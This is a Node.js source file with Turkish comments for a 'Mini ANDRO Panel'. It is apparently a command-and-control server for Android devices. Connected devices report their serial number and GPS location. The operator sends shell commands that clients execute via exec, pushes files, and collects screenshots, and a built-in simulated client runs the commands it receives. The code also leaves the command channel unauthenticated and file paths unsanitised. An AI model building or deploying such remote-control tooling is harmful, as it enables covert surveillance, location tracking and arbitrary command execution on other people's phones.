// andro_panel_full_v4.js
// Termux için full mini ANDRO paneli
// Komut, dosya upload/download, screenshot, GPS, grafik ve modern Bootstrap panel
// ✅ Boş komut hatası giderildi

const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const bodyParser = require('body-parser');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const PORT = process.argv[2] ? parseInt(process.argv[2]) : 9400;
const ADMIN_TOKEN = Math.random().toString(36).slice(2,18);

// Local storage klasörleri
const UPLOAD_DIR = path.join(__dirname,'uploads');
const SCREENSHOT_DIR = path.join(__dirname,'screenshots');
if(!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);
if(!fs.existsSync(SCREENSHOT_DIR)) fs.mkdirSync(SCREENSHOT_DIR);

let clients = {}; 

app.use(bodyParser.json());
app.use(express.urlencoded({extended:true}));
app.use(express.static(__dirname));
app.set('view engine','ejs');
app.set('views', __dirname);

function checkToken(req,res,next){
    if(req.query.token === ADMIN_TOKEN) next();
    else res.status(401).send("Unauthorized");
}

// ===== ROUTES =====
app.get('/', (req,res)=>{
    res.send(`<h2>Mini ANDRO Panel</h2>
    <p>Panel: <a href="/panel?token=${ADMIN_TOKEN}">/panel</a></p>
    <p>Port: ${PORT}</p>`);
});

// Panel
app.get('/panel', checkToken, (req,res)=>{
    let clientData = JSON.stringify(clients);
    res.send(`
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Mini ANDRO Panel</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
<style>
body{font-family:Arial;margin:20px;}
#map{height:300px;margin-bottom:20px;}
.card{margin-bottom:15px;}
.scrollable{max-height:150px;overflow-y:auto;}
</style>
</head>
<body class="container">
<h2 class="my-3">Mini ANDRO Panel</h2>
<div id="map"></div>
<div id="deviceCards" class="row"></div>
<canvas id="clientChart" width="400" height="150"></canvas>

<script>
const socket = io();
let clients = ${clientData};

function renderCards(clients){
    let html='';
    for(let id in clients){
        const c=clients[id];
        html+=\`
        <div class="col-md-4">
            <div class="card">
                <div class="card-body">
                    <h5 class="card-title">\${c.device_name}</h5>
                    <p>Android: \${c.android_version}</p>
                    <p>CPU: \${c.cpu} | RAM: \${c.ram}</p>
                    <p>Serial: \${c.serial}</p>
                    <p>GPS: \${c.gps || 'N/A'}</p>
                    <div class="scrollable">
                        <strong>Logs:</strong>
                        <ul>\${c.logs.map(l=>'<li>'+l+'</li>').join('')}</ul>
                    </div>
                    <p>Dosya Sayısı: \${c.files?.length || 0}</p>
                    <ul>
                        \${(c.files || []).map(f=>'<li><a href="/download?file='+encodeURIComponent(f)+'&token=${ADMIN_TOKEN}">'+f+'</a></li>').join('')}
                    </ul>
                    <p>Screenshot: \${c.screenshots?.length || 0}</p>
                    <ul>
                        \${(c.screenshots || []).map(f=>'<li><a href="/screenshots/'+encodeURIComponent(f)+'">'+f+'</a></li>').join('')}
                    </ul>
                    <button class="btn btn-sm btn-primary" onclick="sendCommand('\${id}')">Komut Gönder</button>
                    <input id="cmd_\${id}" placeholder="Komut" class="form-control form-control-sm mt-1"/>
                    <form onsubmit="uploadFile(event, '\${id}')">
                        <input type="file" id="file_\${id}" class="form-control form-control-sm mt-1"/>
                        <button class="btn btn-sm btn-success mt-1">Upload</button>
                    </form>
                </div>
            </div>
        </div>\`;
    }
    document.getElementById('deviceCards').innerHTML = html;
}

renderCards(clients);

// Grafik
const ctx=document.getElementById('clientChart').getContext('2d');
const chart = new Chart(ctx,{
    type:'bar',
    data:{
        labels:Object.keys(clients),
        datasets:[
            {label:'Komut',data:Object.values(clients).map(c=>c.logs.length),backgroundColor:'rgba(54,162,235,0.6)'},
            {label:'Dosya',data:Object.values(clients).map(c=>c.files?.length ||0),backgroundColor:'rgba(255,99,132,0.6)'},
            {label:'Screenshot',data:Object.values(clients).map(c=>c.screenshots?.length ||0),backgroundColor:'rgba(75,192,192,0.6)'}
        ]
    },
    options:{responsive:true,scales:{y:{beginAtZero:true}}}
});

// Harita
const map = L.map('map').setView([0,0],1);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
    attribution:'&copy; OpenStreetMap contributors'
}).addTo(map);
const markers={};
function updateMarkers(){
    for(let id in clients){
        if(clients[id].gps){
            let coords = clients[id].gps.split(',');
            let lat = parseFloat(coords[0]);
            let lng = parseFloat(coords[1]);
            if(markers[id]){
                markers[id].setLatLng([lat,lng]);
            } else {
                markers[id] = L.marker([lat,lng]).addTo(map).bindPopup(clients[id].device_name);
            }
        }
    }
}
updateMarkers();

// Komut gönderme
function sendCommand(id){
    const cmd = document.getElementById('cmd_'+id).value;
    if(!cmd.trim()){ alert('Komut boş olamaz!'); return; }
    socket.emit('command',{targetId:id,command:cmd});
}

// Dosya upload
function uploadFile(e,id){
    e.preventDefault();
    const fileInput = document.getElementById('file_'+id);
    const file = fileInput.files[0];
    if(!file) return alert('Dosya seçilmedi!');
    const reader = new FileReader();
    reader.onload = function(){
        socket.emit('fileUpload',{targetId:id, name:file.name, data:reader.result});
    }
    reader.readAsDataURL(file);
}

// Socket güncelleme
socket.on('updateClients', data=>{
    clients = data;
    renderCards(clients);
    chart.data.labels = Object.keys(clients);
    chart.data.datasets[0].data = Object.values(clients).map(c=>c.logs.length);
    chart.data.datasets[1].data = Object.values(clients).map(c=>c.files?.length ||0);
    chart.data.datasets[2].data = Object.values(clients).map(c=>c.screenshots?.length ||0);
    chart.update();
    updateMarkers();
});
</script>
</body>
</html>
`);
});

// ===== DOWNLOAD ROUTES =====
app.get('/download', checkToken, (req,res)=>{
    const file = req.query.file;
    if(!file) return res.status(400).send("Missing file");
    const filePath = path.join(UPLOAD_DIR,file);
    if(fs.existsSync(filePath)) res.download(filePath);
    else res.status(404).send("Not found");
});

app.use('/screenshots', express.static(SCREENSHOT_DIR));

// ===== SOCKET.IO SERVER =====
io.on('connection', socket=>{
    console.log('Yeni bağlantı:', socket.id);

    socket.on('register', data=>{
        clients[socket.id] = {
            device_name: data.device_name,
            android_version: data.android_version||'12',
            cpu: data.cpu||'OctaCore',
            ram: data.ram||'4GB',
            serial: data.serial||'ABC123',
            gps:null,
            logs:[],
            files:[],
            screenshots:[]
        };
        io.emit('updateClients', clients);
    });

    socket.on('gps', gps=>{
        if(clients[socket.id]) clients[socket.id].gps = gps;
        io.emit('updateClients', clients);
    });

    socket.on('command', ({targetId, command})=>{
        if(!command || command.trim()===''){
            console.log('Boş komut alındı, çalıştırılmayacak.');
            return;
        }
        if(clients[targetId]){
            io.to(targetId).emit('execute', command);
            clients[targetId].logs.push(command);
        }
        io.emit('updateClients', clients);
    });

    socket.on('fileUpload', ({targetId,name,data})=>{
        if(clients[targetId]){
            const base64Data = data.split(',')[1];
            const filePath = path.join(UPLOAD_DIR,name);
            fs.writeFileSync(filePath,Buffer.from(base64Data,'base64'));
            if(!clients[targetId].files) clients[targetId].files=[];
            clients[targetId].files.push(name);
        }
        io.emit('updateClients', clients);
    });

    socket.on('screenshot', ({name,data})=>{
        if(clients[socket.id]){
            const base64Data = data.split(',')[1];
            const filePath = path.join(SCREENSHOT_DIR,name);
            fs.writeFileSync(filePath,Buffer.from(base64Data,'base64'));
            clients[socket.id].screenshots.push(name);
        }
        io.emit('updateClients', clients);
    });

    socket.on('disconnect', ()=>{
        delete clients[socket.id];
        io.emit('updateClients', clients);
    });
});

// ===== CLIENT SIMÜLASYONU =====
const ioClient = require('socket.io-client');
const clientSocket = ioClient.connect(`http://localhost:${PORT}`);

clientSocket.on('connect', ()=>{
    console.log('Test cihazı servera bağlandı:', clientSocket.id);
    clientSocket.emit('register',{device_name:'Test Telefon'});

    setInterval(()=>{
        const lat = (Math.random()*180-90).toFixed(5);
        const lng = (Math.random()*360-180).toFixed(5);
        clientSocket.emit('gps',`${lat},${lng}`);
    },10000);

    clientSocket.emit('files',['file1.txt','file2.txt']);
    clientSocket.emit('screenshot',{name:'ss1.png',data:'data:image/png;base64,'+Buffer.from('fake').toString('base64')});
});

clientSocket.on('execute', cmd=>{
    if(!cmd || cmd.trim()===''){
        console.log('Boş komut alındı, çalıştırılmayacak.');
        return;
    }
    console.log('Komut alındı:', cmd);
    exec(cmd,(err,stdout,stderr)=>{
        if(err) console.log('Hata:', err);
        if(stdout) console.log('STDOUT:',stdout);
        if(stderr) console.log('STDERR:',stderr);
    });
});

// ===== SERVER START =====
http.listen(PORT,'0.0.0.0',()=>{
    console.log(`Mini ANDRO panel çalışıyor: http://127.0.0.1:${PORT}`);
    console.log(`Panel URL: http://127.0.0.1:${PORT}/panel?token=${ADMIN_TOKEN}`);
});